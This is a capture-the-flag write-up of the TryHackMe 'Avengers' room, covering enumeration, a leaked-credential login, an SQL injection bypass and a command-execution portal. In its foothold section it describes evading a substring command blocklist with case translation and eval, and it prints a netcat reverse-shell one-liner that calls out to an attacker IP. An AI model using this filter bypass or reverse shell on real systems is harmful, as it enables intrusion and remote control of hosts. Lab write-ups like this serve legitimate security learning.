---
title: Avengers (Try Hack Me)
author: Robin Goyal
date: 2021-09-11 18:00 -0400
categories: [Cybersecurity, Writeups]
tags: [thm, ctf, writeup]
hidden: true
image:
  src: https://tryhackme-images.s3.amazonaws.com/room-icons/526fb97c8ede3330397e5cee20a8db6a.png
---

I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.

## Enumeration

Why don't we kick things off with one of our standard nmap scans.

![nmap initial](/assets/img/posts/thm-avengers/nmap-initial.jpg)

This command performs an initial scan of the top 1000 ports of the target. There are 3 open ports:
- 21 (FTP)
- 22 (SSH)
- 80 (HTTP)

From the version information of the SSH service, this target is an Ubuntu Linux OS.

### FTP

I like to approach the FTP service first to test for anonymous authentication but we are out of luck for this room.

No matter! Let's check out the HTTP service.

### HTTP

The web application is a blog of the Avengers where the members of the Avengers have posted about random things?

![landing page](/assets/img/posts/thm-avengers/landing-initial.jpg)

Scrolling to the bottom of the web page, Rocket submitted an entry potentially revealing Groot's password.

![groot password](/assets/img/posts/thm-avengers/groot-password.jpg)

I tried the credentials `groot:iamgroot` on the SSH service but that service only allows SSH keys to authenticate as users. Next, I tried the credentials on the FTP server and the only file present was a file that contained a flag to one of the questions for this room on Try Hack Me.

With not much to go off of here, let's perform some directory enumeration.

![gobuster](/assets/img/posts/thm-avengers/gobuster.jpg)

The /portal is an interesting endpoint as /logout redirects us to it.

![portal](/assets/img/posts/thm-avengers/portal.jpg)

It's an authentication page! These intentionally vulnerable rooms occasionally contain leaked credentials so let's check out the page source.

![portal source](/assets/img/posts/thm-avengers/portal-source.jpg)

Interesting! This authentication page may be susceptible to SQL injection.

#### SQLi

*I will address more in my reflection of this room but I viewed the hint in the Try Hack Me room to solve the SQLi.*

![hint](/assets/img/posts/thm-avengers/hint.jpg)

Once we bypassed the login, we are presented with a "Jarvis" portal that can execute commands for us.

![Jarvis](/assets/img/posts/thm-avengers/jarvis.jpg)

## Initial Foothold

### Remote Command Execution

Trying out some sample commands, the target is processing the commands through a sh/bash interpreter.

The first thing I like to do with potential RCE is to see if I can ping my attacker machine. I start by capturing the traffic on that tun interface filtering for ICMP requests. Next, I run the command to ping the IP address on that interface for a count of 3.

![RCE ping](/assets/img/posts/thm-avengers/ping.jpg)

Fantastic! Since we have outgoing connectivity, let's try to obtain a reverse shell.

While enumerating this webshell, the Node backend was blocking some commands stating them as not allowed. It took LOTS of trial and error to understand the functionality of the application.

I used `pstree -a` to understand how the Node backend was processing our input and executing it.

![pstree](/assets/img/posts/thm-avengers/pstree.jpg)

All of our input is being executed by the Shell with the `-c` flag which executes a single command. This was not as helpful with my limited knowledge of how to abuse this but it may come in handy in the future.

We couldn't just use netcat or bash to generate a reverse shell as a significant number of commands returned "Command disallowed". On top of that, for any commands that generated an error, the application returned "Command not found".

*It took a while but what clicked was that the application was just searching for the disallowed commands in the string. If "cat" was banned but netcat was not, netcat would still be banned since the word cat was in there.*

*I spent a few hours at this stage trying various techniques and methods trying to bypass those commands. Halfway through, I looked at a few writeups but they used the hint provided to read the final flag using the `rev` command as that bypasses the banned tail,cat,more,etc commands. I was determined to generate the reverse shell so I persevered.*

I came up with two methods to bypass this command filtering. For the first method, I base64'd the command that was being blocked and wrapping it with a `$()` to execute the string. The second method utilized the same wrapping but translated the command from all uppercase characters (the server did not check both uppercase and lowercase commands) to lowercase characters. I tested both situations on my system but it failed with any commands that used redirects and pipes.


A bit of google-fu and there was an alternative to use the `eval` command to execute a string. Instead of wrapping the command with `$()`, I used one of the two methods I came up with and evaluated it as a string. It took several hours trying out various techniques to bypass the command filtering and figure out which reverse shell payload would work but I hit the jackpot with the following command!

` eval "$(echo "RM /TMP/F;MKFIFO /TMP/F; CAT /TMP/F | /BIN/SH -I 2>&1 | NC 10.6.5.103 80 > /TMP/F" | tr '[A-Z]' '[a-z]')"
`

A quick breakdown of the command that worked for me:
- The reverse shell payload is from the [PayloadAllTheThings repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd).
- The payload is translated from uppercase to lowercase
- The `"$()"` executes the translation and saves it as a string
- eval executes the string command generating the reverse shell

![reverse shell](/assets/img/posts/thm-avengers/reverse-shell.jpg)

Success! We obtained a shell as root. We were rewarded greatly with the fruits of our labour! We can now grab the final flag and consider this room completed.

## Reflection

This room was challenging for a variety of reasons. I gave up during the SQL injection portion fairly quickly. For the final aspect generating the reverse shell, it would have been easy to read the final flag with the techniques that I had and move on. After giving up quickly on the SQLi, I was determined to solve the challenge.

SQLi is not one of my favourite challenges to solve but that is not an excuse to learn or strive to better at that aspect. There's an abundance of resources on learning and improving at it instead of just trying one type of payload and then throwing sqlmap at it and praying.

I have ways to go to "Try Harder" and be relentless in my persistence. I won't progress far if I give up on a roadblock within the first few minutes.
